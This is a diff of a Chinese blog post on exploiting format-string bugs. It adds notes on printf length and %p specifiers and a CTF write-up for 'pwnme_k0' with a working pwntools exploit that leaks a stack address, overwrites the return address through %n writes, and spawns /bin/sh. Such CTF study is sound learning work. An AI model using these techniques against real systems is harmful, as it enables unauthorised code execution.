@@ -14,7 +14,7 @@ tags:
 
 
 
-## 1. C 中的 printf
+## 0x11 C 中的 printf
 
 在 `C` 语言中具体的使用语法为：
 
@@ -24,7 +24,7 @@ tags:
 
 
 
-### 1）格式化占位符
+### 0x111 格式化占位符
 
 #### **Parameter** 可以忽略或者是：
 
@@ -52,7 +52,20 @@ tags:
 
 
 
-### 2）类型
+**Length**指出浮点型参数或整型参数的长度。此项Microsoft称为“Size”。可以忽略，或者是下述：
+
+| 字符 |                             描述                             |
+| :--: | :----------------------------------------------------------: |
+| `hh` | 对于整数类型，`printf`期待一个从`char`提升的`int`尺寸的整型参数。 |
+| `h`  | 对于整数类型，`printf`期待一个从`short`提升的`int`尺寸的整型参数。 |
+| `l`  | 对于整数类型，`printf`期待一个`long`尺寸的整型参数。对于浮点类型，`printf`期待一个`double`尺寸的整型参数。对于字符串s类型，`printf`期待一个`wchar_t`指针参数。对于字符c类型，`printf`期待一个`wint_t`型的参数。 |
+| `ll` | 对于整数类型，`printf`期待一个`long long`尺寸的整型参数。Microsoft也可以使用`I64`。 |
+| `L`  | 对于浮点类型，`printf`期待一个`long double`尺寸的整型参数。  |
+| `z`  |    对于整数类型，`printf`期待一个`size_t`尺寸的整型参数。    |
+
+**Length**在 `x64` 的程序上，会用上。
+
+### 0x112 类型
 
 **Type**，也称转换说明（conversion specification/specifier），我们常用的是：
 
@@ -62,8 +75,9 @@ tags:
 |   `s`    | 如果没有用l标志，输出[null结尾字符串](https://zh.wikipedia.org/w/index.php?title=Null%E7%BB%93%E5%B0%BE%E5%AD%97%E7%AC%A6%E4%B8%B2&action=edit&redlink=1)直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用`wcrtomb`函数。 |
 |   `c`    | 如果没有用l标志，把int参数转为`unsigned char`型输出；如果用了l标志，把wint_t参数转为包含两个元素的`wchart_t`数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。 |
 |   `n`    | 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 |
+|   `p`    |                          `void *`型                          |
 
-在我们的漏洞利用过程中，我们主要用 `x` 对齐字节和找到我们传入的地址，用 `n` 修改对应地址所对应的值， `c` 可以控制 `n` 写的值，`s` 用来泄露栈上空间的内容。
+在我们的漏洞利用过程中，我们主要用 `x` 对齐字节和找到我们传入的地址，用 `n` 修改对应地址所对应的值， `c` 可以控制 `n` 写的值，`s` 用来泄露栈上空间的内容， `p` 在有些时候可以用来泄露地址。
 
 
 
@@ -73,13 +87,13 @@ tags:
 
 
 
-## 1. protostar_format writeup
+## 0x21 protostar_format writeup
 
 原恒星上面的的题目都很基础，所以我决定，从这里开始。
 
 下面这几个文件并没有开启任何保护，所以在检查的部分，就不赘述了。
 
-### 1）format 0
+### 0x211 format 0
 
 日常 `ida` 打开，发现 `main` 函数中将 `argv[1]` 作为参数并调用了 `vuln` 函数，我们跟进：
 
@@ -108,7 +122,7 @@ if __name__ == '__main__':
 
 
 
-### 2）format 1
+### 0x212 format 1
 
 和上面一样，同样是通过 `main` 函数中将 `argv[1]` 作为参数并调用了 `vuln` 函数，直接看 `vuln` ：
 
@@ -153,7 +167,7 @@ if __name__ == '__main__':
 
 
 
-### 3）format 2
+### 0x213 format 2
 
 这里的 `main` 函数直接调用 `vuln` 函数，我们直接看：
 
@@ -220,7 +234,7 @@ if __name__ == '__main__':
 
 
 
-### 4）format 3
+### 0x214 format 3
 
 直接看 `vuln` ：
 
@@ -275,7 +289,7 @@ if __name__ == '__main__':
 
 
 
-### 5）format 4
+### 0x215 format 4
 
 依旧直接看 `vuln` :
 
@@ -313,6 +327,111 @@ def main():
 if __name__ == '__main__':
     main()
 ```
+
+
+
+## 0x22 pwnme_k0 writeup
+
+拿到这个文件的时候，那时候提供的环境里面并没有 `ida` 只有关键部分的伪 `c代码` ，这个就有点蛋疼了，由于比赛时间太短了（客观借口，主要是我菜），所以这道题在比赛的时候我并没有调试出来，所以我决定赛后分析一下这道题。
+
+首先先 `checksec` 一下程序
+
+```sh
+
+```
+
+看见开启了 `NX` 、`RELRO` ，不能够修改 `got` 表这就有点难受了。
+
+### 程序分析
+
+经过我简单的测试，发现了了这个程序就是一个典型的菜单题，主要流程如下
+
+![pwnme_k0_flow_chart](/image/2019-03-20-linux_pwn_format/pwnme_k0_flow_chart.jpg)
+
+用户信息为 `username` 和 `password`，最大长度均为 20 个字节，并不存在栈溢出漏洞。
+
+在查看信息这里发现了点有趣的东西。
+
+![pwnme_k0_1](/image/2019-03-20-linux_pwn_format/pwnme_k0_1.png)
+
+发现格式化字符串漏洞。
+
+### 利用思路
+
+这里由于可以无限次的修改信息和查看信息，可以说可以无限次的使用格式化字符串漏洞。在程序里，我们发现了一个 `system(“/bin/sh”)` 调用，由于退出菜单是用的 `ret` 指令，所以我们可以尝试对菜单的返回地址进行覆盖，具体流程如下。
+
+1. leak 栈上的地址，得到调用菜单时保存 `eip` 时的偏移量 。
+2. 修改菜单函数的返回地址 改为 `system(“/bin/sh”)` 调用的地址。
+3. 执行 `system("/bin/sh")`
+
+
+
+在这里具体的操作就不过多的赘述了，直接放出 `poc` 。
+
+`poc` :
+
+```python
+# -*- coding: utf-8 -*-
+# !/usr/bin/python env
+from pwn import *
+
+
+def show_info(exp_file):
+    exp_file.recvuntil(">")
+    exp_file.sendline("1")
+
+
+def set_info(exp_file, name, password):
+    exp_file.recvuntil("username(max lenth:20):")
+    exp_file.sendline(name)
+    exp_file.recvuntil("password(max lenth:20):")
+    exp_file.sendline(password)
+    exp_file.recvuntil("1.Sh0w Account Infomation!")
+
+
+def main():
+    debug = 0
+    if debug:
+        exp_file = process("./pwnme_k0")
+        # context.log_level="debug"
+    else:
+        exp_file = remote("127.0.0.1", 10000)
+
+    # Leak the address above the stack and get the address in the stack where the return address.
+    set_info(exp_file, "a"*8, "%6$p")
+    show_info(exp_file)
+    recv_value = exp_file.recvuntil("1.Sh0w Account Infomation!").split("\n")[1]
+    ret_addr = int(recv_value, 16) + 0x8
+    log.info("ret_addr:{ret_addr}".format(ret_addr=hex(ret_addr)))
+
+    # Change the return address to system("/bin/sh")
+    exp_file.recvuntil(">")
+    exp_file.sendline("2")
+    set_info(exp_file, p64(ret_addr), "%166c"+"%8$n")
+    show_info(exp_file)
+
+    exp_file.recvuntil(">")
+    exp_file.sendline("2")
+    set_info(exp_file, p64(ret_addr+1), "%8c"+"%8$n")
+    show_info(exp_file)
+
+    exp_file.recvuntil(">")
+    exp_file.sendline("2")
+    set_info(exp_file, p64(ret_addr+2), "%64c"+"%8$n")
+    show_info(exp_file)
+
+    # Trigger the function return
+    exp_file.recvuntil(">")
+    exp_file.sendline("3")
+
+    exp_file.interactive()
+
+
+if __name__ == '__main__':
+    main()
+```
+
+
 
 
 
